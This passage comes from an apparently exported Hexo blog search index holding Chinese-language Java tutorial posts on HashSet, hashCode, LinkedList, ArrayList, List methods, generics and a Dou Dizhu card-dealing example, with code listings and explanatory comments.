//创建HashSet集合存储Person HashSet&lt;Person&gt; set = new HashSet&lt;&gt;(); Person p1 = new Person(\"小美女\",18); Person p2 = new Person(\"小美女\",18); Person p3 = new Person(\"小美女\",19); System.out.println(p1.hashCode());//1967205423 System.out.println(p2.hashCode());//42121758 System.out.println(p1==p2);//false System.out.println(p1.equals(p2));//false set.add(p1); set.add(p2); set.add(p3); System.out.println(set); &#125;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455package com.itheima.demo02.Set;import java.util.Objects;public class Person &#123; private String name; private int age; public Person() &#123; &#125; public Person(String name, int age) &#123; this.name = name; this.age = age; &#125; @Override public boolean equals(Object o) &#123; if (this == o) return true; if (o == null || getClass() != o.getClass()) return false; Person person = (Person) o; return age == person.age &amp;&amp; Objects.equals(name, person.name); &#125; @Override public int hashCode() &#123; return Objects.hash(name, age); &#125; @Override public String toString() &#123; return \"Person&#123;\" + \"name='\" + name + '\\'' + \", age=\" + age + '&#125;'; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java_Set集合存储元素不重复的原理","slug":"java00174-Set集合存储元素不重复的原理","date":"2020-03-21T17:28:15.000Z","updated":"2020-03-21T17:29:47.228Z","comments":true,"path":"2020/03/22/java00174-Set集合存储元素不重复的原理/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/22/java00174-Set集合存储元素不重复的原理/","excerpt":"","text":"12345678910111213141516171819202122package com.itheima.demo02.Set;import java.util.HashSet;/* Set集合不允许存储重复元素的原理 */public class Demo02HashSetSaveString &#123; public static void main(String[] args) &#123; //创建HashSet集合对象 HashSet&lt;String&gt; set = new HashSet&lt;&gt;(); String s1 = new String(\"abc\"); String s2 = new String(\"abc\"); set.add(s1); set.add(s2); set.add(\"重地\"); set.add(\"通话\"); set.add(\"abc\"); System.out.println(set);//[重地, 通话, abc] &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java_哈希值","slug":"java00173-哈希值","date":"2020-03-21T17:14:47.000Z","updated":"2020-04-02T15:44:49.198Z","comments":true,"path":"2020/03/22/java00173-哈希值/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/22/java00173-哈希值/","excerpt":"","text":"什么是哈希表呢？ 在JDK1.8之前，哈希表底层采用数组+链表实现，即使用链表处理冲突，同一hash值的元素都存储在一个链表里。但是当位于一个桶中的元素较多，即hash值相等的元素较多时，通过key值依次查找的效率较低。而JDK1.8中，哈希表存储采用数组+链表+红黑树实现，当链表长度超过阈值（8）时，将链表转换为红黑树，这样大大减少了查找时间。 简单的来说，哈希表是由数组+链表+红黑树（JDK1.8增加了红黑树部分）实现的，如下图所示。 看到这张图就有人要问了，这个是怎么存储的呢？ 为了方便大家的理解我们结合一个存储流程图来说明一下： 总而言之，JDK1.8引入红黑树大程度优化了HashMap的性能，那么对于我们来讲保证HashSet集合元素的唯一，其实就是根据对象的hashCode和equals方法来决定的。如果我们往集合中存放自定义的对象，那么保证其唯一，就必须复写hashCode和equals方法建立属于当前对象的比较方式。 1234567891011121314151617181920212223242526272829303132333435363738394041package com.itheima.demo03.hashCode;/* 哈希值:是一个十进制的整数,由系统随机给出(就是对象的地址值,是一个逻辑地址,是模拟出来得到地址,不是数据实际存储的物理地址) 在Object类有一个方法,可以获取对象的哈希值 int hashCode() 返回该对象的哈希码值。 hashCode方法的源码: public native int hashCode(); native:代表该方法调用的是本地操作系统的方法 */public class Demo01HashCode &#123; public static void main(String[] args) &#123; //Person类继承了Object类,所以可以使用Object类的hashCode方法 Person p1 = new Person(); int h1 = p1.hashCode(); System.out.println(h1);//1967205423 | 1 Person p2 = new Person(); int h2 = p2.hashCode(); System.out.println(h2);//42121758 | 1 /* toString方法的源码: return getClass().getName() + \"@\" + Integer.toHexString(hashCode()); */ System.out.println(p1);//com.itheima.demo03.hashCode.Person@75412c2f System.out.println(p2);//com.itheima.demo03.hashCode.Person@282ba1e System.out.println(p1==p2);//false /* String类的哈希值 String类重写Obejct类的hashCode方法 */ String s1 = new String(\"abc\"); String s2 = new String(\"abc\"); System.out.println(s1.hashCode());//96354 System.out.println(s2.hashCode());//96354 System.out.println(\"重地\".hashCode());//1179395 System.out.println(\"通话\".hashCode());//1179395 &#125;&#125; 12345678910package com.itheima.demo03.hashCode;public class Person extends Object&#123; //重写hashCode方法 @Override public int hashCode() &#123; return 1; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java_HashSet集合介绍","slug":"java00172-HashSet集合介绍","date":"2020-03-21T17:12:33.000Z","updated":"2020-03-21T17:13:04.475Z","comments":true,"path":"2020/03/22/java00172-HashSet集合介绍/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/22/java00172-HashSet集合介绍/","excerpt":"","text":"HashSet集合介绍 java.util.HashSet是Set接口的一个实现类，它所存储的元素是不可重复的，并且元素都是无序的(即存取顺序不一致)。java.util.HashSet底层的实现其实是一个java.util.HashMap支持，由于我们暂时还未学习，先做了解。 HashSet是根据对象的哈希值来确定元素在集合中的存储位置，因此具有良好的存取和查找性能。保证元素唯一性的方式依赖于：hashCode与equals方法。 12","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java_LinkedList集合","slug":"java00171-LinkedList集合","date":"2020-03-21T16:28:37.000Z","updated":"2020-03-21T17:22:11.658Z","comments":true,"path":"2020/03/22/java00171-LinkedList集合/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/22/java00171-LinkedList集合/","excerpt":"","text":"java.util.LinkedList集合数据存储的结构是链表结构。方便元素添加、删除的集合。 LinkedList是一个双向链表，那么双向链表是什么样子的呢，我们用个图了解下 实际开发中对一个集合元素的添加与删除经常涉及到首尾操作，而LinkedList提供了大量首尾操作的方法。这些方法我们作为了解即可： public void addFirst(E e):将指定元素插入此列表的开头。 public void addLast(E e):将指定元素添加到此列表的结尾。 public E getFirst():返回此列表的第一个元素。 public E getLast():返回此列表的最后一个元素。 public E removeFirst():移除并返回此列表的第一个元素。 public E removeLast():移除并返回此列表的最后一个元素。 public E pop():从此列表所表示的堆栈处弹出一个元素。 public void push(E e):将元素推入此列表所表示的堆栈。 public boolean isEmpty()：如果列表不包含元素，则返回true。 public E remove(int index) 移除此列表中指定位置处的元素。将任何后续元素向左移（从索引中减 1）。返回从列表中删除的元素。 LinkedList是List的子类，List中的方法LinkedList都是可以使用。在开发时，LinkedList集合也可以作为堆栈，队列的结构使用。（了解即可） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899package com.itheima.demo01.List;import java.util.LinkedList;/* java.util.LinkedList集合 implements List接口 LinkedList集合的特点: 1.底层是一个链表结构:查询慢,增删快 2.里边包含了大量操作首尾元素的方法 注意:使用LinkedList集合特有的方法,不能使用多态 - public void addFirst(E e):将指定元素插入此列表的开头。 - public void addLast(E e):将指定元素添加到此列表的结尾。 - public void push(E e):将元素推入此列表所表示的堆栈。 - public E getFirst():返回此列表的第一个元素。 - public E getLast():返回此列表的最后一个元素。 - public E removeFirst():移除并返回此列表的第一个元素。 - public E removeLast():移除并返回此列表的最后一个元素。 - public E pop():从此列表所表示的堆栈处弹出一个元素。 - public boolean isEmpty()：如果列表不包含元素，则返回true。 */public class Demo02LinkedList &#123; public static void main(String[] args) &#123; show03(); &#125; /* - public E removeFirst():移除并返回此列表的第一个元素。 - public E removeLast():移除并返回此列表的最后一个元素。 - public E pop():从此列表所表示的堆栈处弹出一个元素。此方法相当于 removeFirst */ private static void show03() &#123; //创建LinkedList集合对象 LinkedList&lt;String&gt; linked = new LinkedList&lt;&gt;(); //使用add方法往集合中添加元素 linked.add(\"a\"); linked.add(\"b\"); linked.add(\"c\"); System.out.println(linked);//[a, b, c] //String first = linked.removeFirst(); String first = linked.pop(); System.out.println(\"被移除的第一个元素:\"+first); String last = linked.removeLast(); System.out.println(\"被移除的最后一个元素:\"+last); System.out.println(linked);//[b] &#125; /* - public E getFirst():返回此列表的第一个元素。 - public E getLast():返回此列表的最后一个元素。 */ private static void show02() &#123; //创建LinkedList集合对象 LinkedList&lt;String&gt; linked = new LinkedList&lt;&gt;(); //使用add方法往集合中添加元素 linked.add(\"a\"); linked.add(\"b\"); linked.add(\"c\"); //linked.clear();//清空集合中的元素 在获取集合中的元素会抛出NoSuchElementException //public boolean isEmpty()：如果列表不包含元素，则返回true。 if(!linked.isEmpty())&#123; String first = linked.getFirst(); System.out.println(first);//a String last = linked.getLast(); System.out.println(last);//c &#125; &#125; /* - public void addFirst(E e):将指定元素插入此列表的开头。 - public void addLast(E e):将指定元素添加到此列表的结尾。 - public void push(E e):将元素推入此列表所表示的堆栈。此方法等效于 addFirst(E)。 */ private static void show01() &#123; //创建LinkedList集合对象 LinkedList&lt;String&gt; linked = new LinkedList&lt;&gt;(); //使用add方法往集合中添加元素 linked.add(\"a\"); linked.add(\"b\"); linked.add(\"c\"); System.out.println(linked);//[a, b, c] //public void addFirst(E e):将指定元素插入此列表的开头。 //linked.addFirst(\"www\"); linked.push(\"www\"); System.out.println(linked);//[www, a, b, c] //public void addLast(E e):将指定元素添加到此列表的结尾。此方法等效于 add() linked.addLast(\"com\"); System.out.println(linked);//[www, a, b, c, com] &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java_ArrayList集合","slug":"java00170-ArrayList集合","date":"2020-03-21T16:21:14.000Z","updated":"2020-03-21T16:23:07.401Z","comments":true,"path":"2020/03/22/java00170-ArrayList集合/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/22/java00170-ArrayList集合/","excerpt":"","text":"ArrayList集合 java.util.ArrayList集合数据存储的结构是数组结构。元素增删慢，查找快，由于日常开发中使用最多的功能为查询数据、遍历数据，所以ArrayList是最常用的集合。 许多程序员开发时非常随意地使用ArrayList完成任何需求，并不严谨，这种用法是不提倡的。","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java_List集合介绍和常用方法","slug":"java00169-List集合介绍和常用方法","date":"2020-03-21T16:09:51.000Z","updated":"2020-03-21T16:11:24.330Z","comments":true,"path":"2020/03/22/java00169-List集合介绍和常用方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/22/java00169-List集合介绍和常用方法/","excerpt":"","text":"java.util.List接口 extends Collection接口 List接口的特点: 1.有序的集合,存储元素和取出元素的顺序是一致的(存储123 取出123) 2.有索引,包含了一些带索引的方法 3.允许存储重复的元素 List接口中带索引的方法(特有) public void add(int index, E element): 将指定的元素，添加到该集合中的指定位置上。 public E get(int index):返回集合中指定位置的元素。 public E remove(int index): 移除列表中指定位置的元素, 返回的是被移除的元素。 public E set(int index, E element):用指定元素替换集合中指定位置的元素,返回值的更新前的元素。 注意: 操作索引的时候,一定要防止索引越界异常 IndexOutOfBoundsException:索引越界异常,集合会报 ArrayIndexOutOfBoundsException:数组索引越界异常 StringIndexOutOfBoundsException:字符串索引越界异常 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162package com.itheima.demo01.List;import java.util.ArrayList;import java.util.Iterator;import java.util.List;public class Demo01List &#123; public static void main(String[] args) &#123; //创建一个List集合对象,多态 List&lt;String&gt; list = new ArrayList&lt;&gt;(); //使用add方法往集合中添加元素 list.add(\"a\"); list.add(\"b\"); list.add(\"c\"); list.add(\"d\"); list.add(\"a\"); //打印集合 System.out.println(list);//[a, b, c, d, a] 不是地址重写了toString //public void add(int index, E element): 将指定的元素，添加到该集合中的指定位置上。 //在c和d之间添加一个itheima list.add(3,\"itheima\");//[a, b, c, itheima, d, a] System.out.println(list); //public E remove(int index): 移除列表中指定位置的元素, 返回的是被移除的元素。 //移除元素 String removeE = list.remove(2); System.out.println(\"被移除的元素:\"+removeE);//被移除的元素:c System.out.println(list);//[a, b, itheima, d, a] //public E set(int index, E element):用指定元素替换集合中指定位置的元素,返回值的更新前的元素。 //把最后一个a,替换为A String setE = list.set(4, \"A\"); System.out.println(\"被替换的元素:\"+setE);//被替换的元素:a System.out.println(list);//[a, b, itheima, d, A] //List集合遍历有3种方式 //使用普通的for循环 for(int i=0; i&lt;list.size(); i++)&#123; //public E get(int index):返回集合中指定位置的元素。 String s = list.get(i); System.out.println(s); &#125; System.out.println(\"-----------------\"); //使用迭代器 Iterator&lt;String&gt; it = list.iterator(); while(it.hasNext())&#123; String s = it.next(); System.out.println(s); &#125; System.out.println(\"-----------------\"); //使用增强for for (String s : list) &#123; System.out.println(s); &#125; String r = list.get(5);//IndexOutOfBoundsException: Index 5 out-of-bounds for length 5 System.out.println(r); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java数据结构_红黑树","slug":"java00168数据结构-红黑树","date":"2020-03-21T16:06:51.000Z","updated":"2020-03-21T16:07:20.394Z","comments":true,"path":"2020/03/22/java00168数据结构-红黑树/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/22/java00168数据结构-红黑树/","excerpt":"","text":"数据结构_红黑树","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java数据结构_链表","slug":"java00167数据结构-链表","date":"2020-03-21T15:31:33.000Z","updated":"2020-03-21T16:05:41.456Z","comments":true,"path":"2020/03/21/java00167数据结构-链表/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/21/java00167数据结构-链表/","excerpt":"","text":"数据结构_链表","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java数据结构_数组","slug":"java00166数据结构-数组","date":"2020-03-21T15:26:58.000Z","updated":"2020-03-21T15:28:17.701Z","comments":true,"path":"2020/03/21/java00166数据结构-数组/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/21/java00166数据结构-数组/","excerpt":"","text":"数组 数据结构","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java数据结构_队列","slug":"java00165数据结构-队列","date":"2020-03-21T15:23:40.000Z","updated":"2020-03-22T05:10:23.704Z","comments":true,"path":"2020/03/21/java00165数据结构-队列/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/21/java00165数据结构-队列/","excerpt":"","text":"队列数据结构","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java数据结构_栈","slug":"java00164数据结构-栈","date":"2020-03-21T15:18:15.000Z","updated":"2020-03-21T15:20:43.559Z","comments":true,"path":"2020/03/21/java00164数据结构-栈/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/21/java00164数据结构-栈/","excerpt":"","text":"栈数据结构","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"斗地主案例的需求分析和代码实现","slug":"java00163斗地主案例的需求分析和代码实现","date":"2020-03-16T03:49:07.000Z","updated":"2020-03-16T03:51:45.054Z","comments":true,"path":"2020/03/16/java00163斗地主案例的需求分析和代码实现/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/16/java00163斗地主案例的需求分析和代码实现/","excerpt":"","text":"斗地主案例的需求分析和代码实现 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283package com.itheima.demo04.Test;import java.util.ArrayList;import java.util.Collections;/* 斗地主综合案例: 1.准备牌 2.洗牌 3.发牌 4.看牌 */public class DouDiZhu &#123; public static void main(String[] args) &#123; //1.准备牌 //定义一个存储54张牌的ArrayList集合,泛型使用String ArrayList&lt;String&gt; poker = new ArrayList&lt;&gt;(); //定义两个数组,一个数组存储牌的花色,一个数组存储牌的序号 String[] colors = &#123;\"♠\",\"♥\",\"♣\",\"♦\"&#125;; String[] numbers = &#123;\"2\",\"A\",\"K\",\"Q\",\"J\",\"10\",\"9\",\"8\",\"7\",\"6\",\"5\",\"4\",\"3\"&#125;; //先把大王和小王存储到poker集合中 poker.add(\"大王\"); poker.add(\"小王\"); //循环嵌套遍历两个数组,组装52张牌 for(String number : numbers)&#123; for (String color : colors) &#123; //System.out.println(color+number); //把组装好的牌存储到poker集合中 poker.add(color+number); &#125; &#125; //System.out.println(poker); /* 2.洗牌 使用集合的工具类Collections中的方法 static void shuffle(List&lt;?&gt; list) 使用默认随机源对指定列表进行置换。 */ Collections.shuffle(poker); //System.out.println(poker); /* 3.发牌 */ //定义4个集合,存储玩家的牌和底牌 ArrayList&lt;String&gt; player01 = new ArrayList&lt;&gt;(); ArrayList&lt;String&gt; player02 = new ArrayList&lt;&gt;(); ArrayList&lt;String&gt; player03 = new ArrayList&lt;&gt;(); ArrayList&lt;String&gt; diPai = new ArrayList&lt;&gt;(); /* 遍历poker集合,获取每一张牌 使用poker集合的索引%3给3个玩家轮流发牌 剩余3张牌给底牌 注意: 先判断底牌(i&gt;=51),否则牌就发没了 */ for (int i = 0; i &lt; poker.size() ; i++) &#123; //获取每一张牌 String p = poker.get(i); //轮流发牌 if(i&gt;=51)&#123; //给底牌发牌 diPai.add(p); &#125;else if(i%3==0)&#123; //给玩家1发牌 player01.add(p); &#125;else if(i%3==1)&#123; //给玩家2发牌 player02.add(p); &#125;else if(i%3==2)&#123; //给玩家3发牌 player03.add(p); &#125; &#125; //4.看牌 System.out.println(\"刘德华:\"+player01); System.out.println(\"周润发:\"+player02); System.out.println(\"周星驰:\"+player03); System.out.println(\"底牌:\"+diPai); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java泛型通配符","slug":"java00162泛型通配符","date":"2020-03-16T03:38:57.000Z","updated":"2020-03-28T05:33:16.739Z","comments":true,"path":"2020/03/16/java00162泛型通配符/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/16/java00162泛型通配符/","excerpt":"","text":"java泛型通配符 当使用泛型类或者接口时，传递的数据中，泛型类型不确定，可以通过通配符&lt;?&gt;表示。但是一旦使用泛型的通配符后，只能使用Object类中的共性方法，集合中元素自身方法无法使用。 通配符基本使用 泛型的通配符:不知道使用什么类型来接收的时候,此时可以使用?,?表示未知通配符。 此时只能接受数据,不能往该集合中存储数据。 泛型的通配符: ?:代表任意的数据类型 使用方式: 不能创建对象使用 只能作为方法的参数使用 泛型的上限： 格式：类型名称 &lt;? extends 类 &gt; 对象名称 意义： 只能接收该类型及其子类 泛型的下限： 格式： 类型名称 &lt;? super 类 &gt; 对象名称 意义： 只能接收该类型及其父类型 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647package com.itheima.demo03.Generic;import java.util.ArrayList;import java.util.Iterator;public class Demo05Generic &#123; public static void main(String[] args) &#123; ArrayList&lt;Integer&gt; list01 = new ArrayList&lt;&gt;(); list01.add(1); list01.add(2); ArrayList&lt;String&gt; list02 = new ArrayList&lt;&gt;(); list02.add(\"a\"); list02.add(\"b\"); printArray(list01); printArray(list02); //ArrayList&lt;?&gt; list03 = new ArrayList&lt;?&gt;(); &#125; /* 定义一个方法,能遍历所有类型的ArrayList集合 这时候我们不知道ArrayList集合使用什么数据类型,可以泛型的通配符?来接收数据类型 注意: 泛型没有继承概念的 //报错 public static void printArray(ArrayList&lt;Object&gt; list)&#123; &#125; */ //如果尖括号中写Integer,printArray(list02);会报错 //如果尖括号中写String,printArray(list01);会报错 //所有我们使用泛型通配符 public static void printArray(ArrayList&lt;?&gt; list)&#123; //使用迭代器遍历集合 Iterator&lt;?&gt; it = list.iterator(); while(it.hasNext())&#123; //it.next()方法,取出的元素是Object,可以接收任意的数据类型 Object o = it.next(); System.out.println(o); &#125; &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738package com.itheima.demo03.Generic;import java.util.ArrayList;import java.util.Collection;/* 泛型的上限限定: ? extends E 代表使用的泛型只能是E类型的子类/本身 泛型的下限限定: ? super E 代表使用的泛型只能是E类型的父类/本身 */public class Demo06Generic &#123; public static void main(String[] args) &#123; Collection&lt;Integer&gt; list1 = new ArrayList&lt;Integer&gt;(); Collection&lt;String&gt; list2 = new ArrayList&lt;String&gt;(); Collection&lt;Number&gt; list3 = new ArrayList&lt;Number&gt;(); Collection&lt;Object&gt; list4 = new ArrayList&lt;Object&gt;(); getElement1(list1); //getElement1(list2);//报错 getElement1(list3); //getElement1(list4);//报错 //getElement2(list1);//报错 //getElement2(list2);//报错 getElement2(list3); getElement2(list4); /* 类与类之间的继承关系 Integer extends Number extends Object String extends Object */ &#125; // 泛型的上限：此时的泛型?，必须是Number类型或者Number类型的子类 public static void getElement1(Collection&lt;? extends Number&gt; coll)&#123;&#125; // 泛型的下限：此时的泛型?，必须是Number类型或者Number类型的父类 public static void getElement2(Collection&lt;? super Number&gt; coll)&#123;&#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java定义和使用含有泛型的接口","slug":"java00161定义和使用含有泛型的接口","date":"2020-03-16T03:30:48.000Z","updated":"2020-03-16T03:36:58.757Z","comments":true,"path":"2020/03/16/java00161定义和使用含有泛型的接口/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/16/java00161定义和使用含有泛型的接口/","excerpt":"","text":"java定义和使用含有泛型的接口 定义格式： 12修饰符 interface 接口名&lt;代表泛型的变量&gt; &#123; &#125; 123456789101112131415161718package com.itheima.demo03.Generic;/* 测试含有泛型的接口 */public class Demo04GenericInterface &#123; public static void main(String[] args) &#123; //创建GenericInterfaceImpl1对象 GenericInterfaceImpl1 gi1 = new GenericInterfaceImpl1(); gi1.method(\"字符串\"); //创建GenericInterfaceImpl2对象 GenericInterfaceImpl2&lt;Integer&gt; gi2 = new GenericInterfaceImpl2&lt;&gt;(); gi2.method(10); GenericInterfaceImpl2&lt;Double&gt; gi3 = new GenericInterfaceImpl2&lt;&gt;(); gi3.method(8.8); &#125;&#125; 1234567891011121314151617package com.itheima.demo03.Generic;/* 含有泛型的接口,第一种使用方式:定义接口的实现类,实现接口,指定接口的泛型 public interface Iterator&lt;E&gt; &#123; E next(); &#125; Scanner类实现了Iterator接口,并指定接口的泛型为String,所以重写的next方法泛型默认就是String public final class Scanner implements Iterator&lt;String&gt;&#123; public String next() &#123;&#125; &#125; */public class GenericInterfaceImpl1 implements GenericInterface&lt;String&gt;&#123; @Override public void method(String s) &#123; System.out.println(s); &#125;&#125; 1234567package com.itheima.demo03.Generic;/* 定义含有泛型的接口 */public interface GenericInterface&lt;I&gt; &#123; public abstract void method(I i);&#125; 1234567891011121314151617181920package com.itheima.demo03.Generic;/* 含有泛型的接口第二种使用方式:接口使用什么泛型,实现类就使用什么泛型,类跟着接口走 就相当于定义了一个含有泛型的类,创建对象的时候确定泛型的类型 public interface List&lt;E&gt;&#123; boolean add(E e); E get(int index); &#125; public class ArrayList&lt;E&gt; implements List&lt;E&gt;&#123; public boolean add(E e) &#123;&#125; public E get(int index) &#123;&#125; &#125; */public class GenericInterfaceImpl2&lt;I&gt; implements GenericInterface&lt;I&gt; &#123; @Override public void method(I i) &#123; System.out.println(i); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java定义和使用含有泛型的方法","slug":"java00160定义和使用含有泛型的方法","date":"2020-03-16T03:24:53.000Z","updated":"2020-03-16T03:37:09.101Z","comments":true,"path":"2020/03/16/java00160定义和使用含有泛型的方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/16/java00160定义和使用含有泛型的方法/","excerpt":"","text":"java定义和使用含有泛型的方法 定义含有泛型的方法: 泛型定义在方法的修饰符和返回值类型之间 格式: 123修饰符 &lt;泛型&gt; 返回值类型 方法名(参数列表(使用泛型))&#123;方法体;&#125; 含有泛型的方法,在调用方法的时候确定泛型的数据类型 传递什么类型的参数,泛型就是什么类型 12345678910111213141516171819202122232425package com.itheima.demo03.Generic;/* 测试含有泛型的方法 */public class Demo03GenericMethod &#123; public static void main(String[] args) &#123; //创建GenericMethod对象 GenericMethod gm = new GenericMethod(); /* 调用含有泛型的方法method01 传递什么类型,泛型就是什么类型 */ gm.method01(10); gm.method01(\"abc\"); gm.method01(8.8); gm.method01(true); gm.method02(\"静态方法,不建议创建对象使用\"); //静态方法,通过类名.方法名(参数)可以直接使用 GenericMethod.method02(\"静态方法\"); GenericMethod.method02(1); &#125;&#125; 12345678910111213package com.itheima.demo03.Generic;public class GenericMethod &#123; //定义一个含有泛型的方法 public &lt;M&gt; void method01(M m)&#123; System.out.println(m); &#125; //定义一个含有泛型的静态方法 public static &lt;S&gt; void method02(S s)&#123; System.out.println(s); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java定义和使用含有泛型的类","slug":"java00159定义和使用含有泛型的类","date":"2020-03-16T03:17:49.000Z","updated":"2020-03-21T15:07:08.567Z","comments":true,"path":"2020/03/16/java00159定义和使用含有泛型的类/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/16/java00159定义和使用含有泛型的类/","excerpt":"","text":"java定义和使用含有泛型的类 定义一个含有泛型的类,模拟ArrayList集合 泛型是一个未知的数据类型,当我们不确定什么什么数据类型的时候,可以使用泛型 泛型可以接收任意的数据类型,可以使用Integer,String,Student… 创建对象的时候确定泛型的数据类型 定义格式： 123修饰符 class 类名&lt;代表泛型的变量&gt;&#123; &#125; 1234567891011121314151617181920212223package com.itheima.demo03.Generic;public class Demo02GenericClass &#123; public static void main(String[] args) &#123; //不写泛型默认为Object类型 GenericClass gc = new GenericClass(); gc.setName(\"只能是字符串\"); Object obj = gc.getName(); //创建GenericClass对象,泛型使用Integer类型 GenericClass&lt;Integer&gt; gc2 = new GenericClass&lt;&gt;(); gc2.setName(1); Integer name = gc2.getName(); System.out.println(name); //创建GenericClass对象,泛型使用String类型 GenericClass&lt;String&gt; gc3 = new GenericClass&lt;&gt;(); gc3.setName(\"小明\"); String name1 = gc3.getName(); System.out.println(name1); &#125;&#125; 12345678910111213package com.itheima.demo03.Generic;public class GenericClass&lt;E&gt; &#123; private E name; public E getName() &#123; return name; &#125; public void setName(E name) &#123; this.name = name; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java使用泛型的好处","slug":"java00158使用泛型的好处","date":"2020-03-16T03:09:52.000Z","updated":"2020-03-16T03:16:18.699Z","comments":true,"path":"2020/03/16/java00158使用泛型的好处/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/16/java00158使用泛型的好处/","excerpt":"","text":"java使用泛型的好处 创建集合对象,使用泛型 好处: 避免了类型转换的麻烦,存储的是什么类型,取出的就是什么类型 把运行期异常(代码运行之后会抛出的异常),提升到了编译期(写代码的时候会报错) 弊端: 泛型是什么类型,只能存储什么类型的数据 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253package com.itheima.demo03.Generic;import java.util.ArrayList;import java.util.Iterator;public class Demo01Generic &#123; public static void main(String[] args) &#123; show02(); &#125; private static void show02() &#123; ArrayList&lt;String&gt; list = new ArrayList&lt;&gt;(); list.add(\"abc\"); //list.add(1);//add(java.lang.String)in ArrayList cannot be applied to (int) //使用迭代器遍历list集合 Iterator&lt;String&gt; it = list.iterator(); while(it.hasNext())&#123; String s = it.next(); System.out.println(s+\"-&gt;\"+s.length()); &#125; &#125; /* 创建集合对象,不使用泛型 好处: 集合不使用泛型,默认的类型就是Object类型,可以存储任意类型的数据 弊端: 不安全,会引发异常 */ private static void show01() &#123; ArrayList list = new ArrayList(); list.add(\"abc\"); list.add(1); //使用迭代器遍历list集合 //获取迭代器 Iterator it = list.iterator(); //使用迭代器中的方法hasNext和next遍历集合 while(it.hasNext())&#123; //取出元素也是Object类型 Object obj = it.next(); System.out.println(obj); //想要使用String类特有的方法,length获取字符串的长度;不能使用 多态 Object obj = \"abc\"; //需要向下转型 //会抛出ClassCastException类型转换异常,不能把Integer类型转换为String类型 String s = (String)obj; System.out.println(s.length()); &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java泛型的概念","slug":"java00157泛型的概念","date":"2020-03-16T03:04:45.000Z","updated":"2020-03-16T03:06:37.802Z","comments":true,"path":"2020/03/16/java00157泛型的概念/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/16/java00157泛型的概念/","excerpt":"","text":"java泛型的概念 在前面学习集合时，我们都知道集合中是可以存放任意对象的，只要把对象存储集合后，那么这时他们都会被提升成Object类型。当我们在取出每一个对象，并且进行相应的操作，这时必须采用类型转换。","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java增强for循环","slug":"java00156增强for循环","date":"2020-03-16T01:55:15.000Z","updated":"2020-03-21T14:59:03.006Z","comments":true,"path":"2020/03/16/java00156增强for循环/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/16/java00156增强for循环/","excerpt":"","text":"java增强for循环 增强for循环: 底层使用的也是迭代器,使用for循环的格式,简化了迭代器的书写 